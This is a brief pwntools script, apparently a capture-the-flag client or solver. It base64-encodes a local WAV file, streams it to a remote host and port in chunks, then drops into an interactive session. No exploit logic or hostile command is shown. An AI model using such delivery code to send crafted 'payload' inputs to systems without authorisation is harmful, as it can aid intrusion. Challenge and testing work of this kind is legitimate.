from pwn import *
import base64
io = remote(sys.argv[1], int(sys.argv[2]))

payload = open("input.wav", "rb").read()
payload = base64.b64encode(payload)

for i in range(0, len(payload), 1024):
    io.sendline(payload[i:i+1024])
    sleep(0.1)

io.sendline(b"EOF")
io.interactive()